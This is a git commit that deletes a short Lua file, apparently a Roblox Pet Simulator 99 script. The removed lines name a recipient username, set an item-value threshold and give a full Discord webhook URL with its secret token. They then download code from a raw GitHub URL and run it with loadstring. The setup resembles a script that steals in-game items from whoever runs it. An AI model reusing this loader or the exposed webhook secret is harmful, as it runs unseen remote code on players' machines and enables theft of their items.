25357fc5bfb6875eecb9fc581424759c525602a2
crobv <pillawaycontact@gmail.com>
2025-05-13 22:57:26 +0100

    Delete ps99.lua

--- ps99.lua
+++
@@ -1,6 +0,0 @@
-Username = "Cvrtierrr"
-Username2 = "Cvrtierrr"
-MinimumRAP = 1000
-Webhook = "https://discord.com/api/webhooks/1371968954704068698/79IeOaXO5Kr7RDjqfoUB2mBWQZGjTAd_Kmufd4lU5ZstspS__Tv8j-XDWgly9BCGEG06"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/214scripts/dumb/refs/heads/main/ps99%20test"))()
